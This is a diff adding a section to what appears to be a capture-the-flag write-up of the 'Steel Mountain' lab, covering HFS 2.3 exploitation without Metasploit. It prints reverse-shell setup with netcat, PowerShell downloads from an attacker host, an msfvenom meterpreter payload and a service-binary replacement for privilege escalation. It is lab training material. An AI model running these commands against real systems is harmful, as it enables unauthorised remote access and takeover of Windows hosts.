@@ -118,3 +118,87 @@ Here's the flag!.
 
 ![Alt text](../Screenshots/Steel_Mountain/root_flag.png)
 
+### Exploitation without Metasploit
+
+We need to do a google search about the exploit of hfs version 2.3, and it takes us to exploit-db, the link is given below.
+
+[Exploit](https://www.exploit-db.com/exploits/39161)
+
+Download the exploit and run it. Remember to run it via python2, otherwise modify the code according to python3 syntax.
+
+Before running, we need to have some setup that is required by the exploit.
+1. Download the netcat exe file from internet
+2. run the netcat server on attacker's machine to recieve the connectionn from the target.
+
+To Download netcat exe, use the following link:
+[netcat exe](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe)
+You need to change the name of binary because our payload is requests nc.exe instead of ncat.exe. Use followind command to change the name:
+
+```bash
+mv ncat.exe nc.exe
+```
+
+Now, run the netcat server using following command:
+```bash
+nc -lvnp 4443
+```
+
+Now, change the `ip_addr` to attacker's machine ip and `local_port` to attacker's machine where netcat server is running. In my case it is 4443.
+
+Now, run the exploit using following command:
+
+```bash
+python2 exploit.py target_ip 8080
+```
+![Alt text](../Screenshots/Steel_Mountain/shell_without_metasploit.png)
+
+Yeah! We got the shell.
+
+Now, we need to escalate our privileges. We know the technique.
+
+For this purpose, we need winpeas. It is used for enumeration at windows machine. You can download it from the following link:
+[winPEAS](https://github.com/peass-ng/PEASS-ng/releases/winPEASx64.exe)
+
+Now, copy the winPEAS binary to target machine using following command:
+```powershell
+powershell -NoP -NonI -C "Invoke-WebRequest -Uri 'http://10.8.25.176:8000/winPEASx64.exe' -OutFile $env:USERPROFILE\\Desktop\\winpeas.exe"
+```
+Run it:
+```
+.\winpeas.exe
+```
+![Alt text](../Screenshots/Steel_Mountain/Service_Enumeration.png)
+
+In the above picture, you can see that **No quotes and Space detected**. It is also giving us the path of binary running by that process which is **C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe**. From this screenshot note service name as well **AdvancedSystemCareService9**.
+
+#### Technique
+Our technique would be the same as we done previously. Replace that binary with our malicious payload with the same name as **ASCService.exe**. We can copy the payload from attacker's machine to target machine.
+
+First we need to create it using msfvenom. Use command:
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=attackers_port -f exe -o ASCService.exe
+```
+In this command, attackers_port is the port where netcat server is at listening mode for incoming connections. Now, we need to make sure a web server (python server) is running:
+```
+python -m http.server 8000
+```
+Now, use the following command to copy this payload to target server:
+```
+powershell -NoP -NonI -C "Invoke-WebRequest -Uri 'http://10.8.25.176:8000/ASCService.exe' -OutFile 'C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe'"
+```
+If the above command of copy is failed, then stop the service and then run the command again.
+Command to stop the service:
+```
+net stop AdvancedSystemCareService9
+```
+After successfully transfer of payload, run the command to start the service but make sure netcat listener is running on attacker's machine. Command to run netcat listener:
+```bash
+nc -lvnp 4443
+```
+In the above command, make sure 4443 is the same port as you gave LPORT during payload creation through msfvenom.
+Now, start the service:
+```
+net start AdvancedSystemCareService9
+```
+Boom! Got the root shell.
+![Alt text](../Screenshots/Steel_Mountain/root_shell_no_metasploit.png)
